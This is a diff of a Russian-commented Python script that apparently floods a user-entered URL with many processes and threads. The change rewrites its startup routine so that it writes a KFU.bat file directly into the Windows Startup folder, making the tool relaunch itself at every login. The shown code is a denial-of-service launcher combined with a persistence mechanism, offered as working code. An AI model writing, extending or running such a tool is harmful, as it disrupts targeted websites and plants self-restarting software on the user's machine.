@@ -29,46 +29,31 @@ def start_processes(target_url, process_count, thread_count):
         process = multiprocessing.Process(target=start_threads, args=(target_url, thread_count))
         process.start()
         print(f"{i + 1} процесс запущен!")
-def create_bat_file():
-    # Создаем BAT файл в текущей директории
+
+
+def create_bat_in_startup():
+    # Определяем путь к папке автозагрузки
+    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+
+    # Создаем BAT файл непосредственно в папке автозагрузки
     bat_filename = 'KFU.bat'
+    bat_dest_path = os.path.join(startup_path, bat_filename)
     bat_content = """@echo off
     cd /d %~dp0
     python "{}"
     """.format(os.path.abspath(__file__))
 
-    with open(bat_filename, 'w') as bat_file:
-        bat_file.write(bat_content)
-    print(f"BAT файл {bat_filename} был создан в текущей директории.")
-
-
-def add_bat_to_startup():
-    # Определяем путь к папке автозагрузки
-    username = getpass.getuser()
-    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-
-    # Путь к BAT файлу
-    bat_filename = 'KFU.bat'  # Имя bat файла
-    bat_source_path = os.path.join(os.getcwd(), bat_filename)  # Путь к bat файлу в текущей директории
-    bat_dest_path = os.path.join(startup_path, bat_filename)  # Путь к папке автозагрузки
-
     # Проверяем, есть ли уже bat файл в папке автозагрузки
     if not os.path.exists(bat_dest_path):
-        # Если bat файл не найден, копируем его в папку автозагрузки
-        if os.path.exists(bat_source_path):
-            shutil.copy(bat_source_path, bat_dest_path)
-            print(f"Файл {bat_filename} был перемещен в папку автозагрузки.")
-        else:
-            print(f"Ошибка: Файл {bat_filename} не найден в текущей директории.")
+        with open(bat_dest_path, 'w') as bat_file:
+            bat_file.write(bat_content)
+        print(f"BAT файл {bat_filename} был создан в папке автозагрузки.")
     else:
-        print(f"Файл {bat_filename} уже существует в папке автозагрузки.")
-
+        print(f"BAT файл {bat_filename} уже существует в папке автозагрузки.")
 
 if __name__ == "__main__":
     # Создаем BAT файл
-    create_bat_file()
-    # Запускаем добавление BAT файла в автозагрузку
-    add_bat_to_startup()
+    create_bat_in_startup()
 
     url = input("Введите URL: ")
     process_count = 8 # Количество процессов
